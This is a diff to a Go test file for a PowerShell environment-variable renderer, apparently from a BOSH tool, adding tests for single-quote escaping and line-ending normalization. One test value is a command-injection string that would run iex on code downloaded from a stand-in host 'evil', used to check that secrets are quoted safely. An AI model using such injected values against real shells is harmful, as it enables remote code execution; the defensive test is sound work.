@@ -22,7 +22,19 @@ var _ = Describe(renderers.ShellTypePowershell, func() {
 				key := "KEY"
 				value := "value"
 				result := renderer.RenderEnvironmentVariable(key, value)
-				Expect(result).To(Equal("$env:KEY=\"value\""))
+				Expect(result).To(Equal("$env:KEY='value'"))
+			})
+			It("shell-quotes values containing powershell metacharacters", func() {
+				key := "BOSH_CLIENT_SECRET"
+				value := `x";iex(new-object net.webclient).downloadstring('evil')#`
+				result := renderer.RenderEnvironmentVariable(key, value)
+				Expect(result).To(Equal(`$env:BOSH_CLIENT_SECRET='x";iex(new-object net.webclient).downloadstring(''evil'')#'`))
+			})
+			It("escapes embedded single quotes instead of breaking out of the quoted string", func() {
+				key := "KEY"
+				value := "it's a test"
+				result := renderer.RenderEnvironmentVariable(key, value)
+				Expect(result).To(Equal(`$env:KEY='it''s a test'`))
 			})
 		})
 		Context("WhenMultiLine", func() {
@@ -35,6 +47,12 @@ var _ = Describe(renderers.ShellTypePowershell, func() {
 			It("appends newline if not present", func() {
 				key := "KEY"
 				value := "1\r\n2\r\n3\r\n4"
+				result := renderer.RenderEnvironmentVariable(key, value)
+				Expect(result).To(Equal("$env:KEY='\r\n1\r\n2\r\n3\r\n4\r\n'"))
+			})
+			It("normalizes a trailing bare \\n to \\r\\n without adding an extra blank line", func() {
+				key := "KEY"
+				value := "1\r\n2\r\n3\r\n4\n"
 				result := renderer.RenderEnvironmentVariable(key, value)
 				Expect(result).To(Equal("$env:KEY='\r\n1\r\n2\r\n3\r\n4\r\n'"))
 			})
